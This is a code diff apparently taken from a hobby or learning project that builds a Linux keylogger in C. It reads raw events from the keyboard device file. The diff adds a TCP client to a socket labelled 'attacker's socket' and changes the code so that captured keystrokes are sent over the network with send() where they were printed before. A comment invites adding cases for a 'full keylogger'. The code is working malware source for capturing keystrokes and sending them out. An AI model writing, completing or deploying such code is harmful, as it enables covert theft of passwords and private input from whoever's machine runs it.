@@ -3,7 +3,7 @@
 use the keyboard event file in /dev/
 take argument
 
-we cannot use fopen or fread to read events because of blocking behavior
+cannot use fopen or fread to read events because of blocking behavior
 use sys functions provided by kernel to read keyboard events (documentation for system functions are found in man 2), check man syscalls
 
 Buffer to allocate is the input_event struct in header linux/input.h https://stackoverflow.com/questions/21204798/read-in-linux-for-event-file
@@ -22,13 +22,18 @@ must flush stream to avoid buffering, use fflush()
 #include <fcntl.h>
 #include <unistd.h>
 #include <linux/input.h>
+#include <strings.h>
+
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <netinet/in.h>
 
 // attacker's socket
-#define IP "127.0.0.0"
+#define IP "127.0.0.1"
 #define PORT 8080
 
-
-void print(int fd);
+int tcp_connect(int *socket_fd);
+void print(int fd, int socket_fd);
 
 int main(int argc, char *argv[]) {
     if (argc != 2) {
@@ -45,15 +50,50 @@ int main(int argc, char *argv[]) {
 
     // open socket
 
-    // batch and print
-    print(fd);
+    int socket_fd = -1;
+    if (tcp_connect(&socket_fd) != 0) {
+        return 1;
+    }
 
+    // print
+    print(fd, socket_fd);
+
+    close(socket_fd);
+    return 0;
 }
 
-void print(int fd) {
+int tcp_connect(int *socket_fd) {
+    // create socket fd
+    *socket_fd = socket(AF_INET, SOCK_STREAM, 0);
+
+    if (*socket_fd < 0) {
+        fprintf(stderr, "Error creating socket\n");
+        return 1;
+    }
+    // fill struct
+    struct sockaddr_in server;
+    bzero(&server, sizeof(server));
+
+    server.sin_family = AF_INET;
+    server.sin_port = htons(PORT);
+    server.sin_addr.s_addr = inet_addr(IP);
+    // connect socket fd to address described in sockaddr_in struct
+    if (connect(*socket_fd, (struct sockaddr *)&server, sizeof(server)) != 0) {
+        perror("Could not connect\n");
+        close(*socket_fd);
+        return 1;
+    }
+    fprintf(stdout, "Connetion succeeded\n");
+    return 0;
+}
+
+void print(int fd, int socket_fd) {
+
     struct input_event ie;
+
     for (;;) {
         read(fd, &ie, sizeof(ie));
+
         if (ie.type != EV_KEY)
             continue;
         if (ie.value != 1)
@@ -66,28 +106,19 @@ void print(int fd) {
         } else {
             switch (ie.code) {
                 case KEY_Q:
-                    printf("q"); break;
-                case KEY_W:
-                    printf("w"); break;
-                case KEY_E:
-                    printf("e"); break;
-                case KEY_R:
-                    printf("r"); break;
-                case KEY_T:
-                    printf("t"); break;
-                case KEY_Y:
-                    printf("y"); break;
+                    send(socket_fd, "q", 1, 0);
+                    break;
                 case KEY_SPACE:
-                    printf(" "); break;
+                    send(socket_fd, " ", 1, 0);
+                    break;
                 case KEY_BACKSPACE:
-                    printf("(backspace)"); break;
-                case KEY_CAPSLOCK:
-                    printf("(capslock)"); break;
+                    send(socket_fd, "(backspace)", 11, 0);
+                    break;
                 // add more case statements for full keylogger
                 default:
                     printf("Unknown key: %d\n", ie.code);
             }
         }
-        fflush(stdout);
+        // fflush(stdout); not necessary for send()
     }
 }
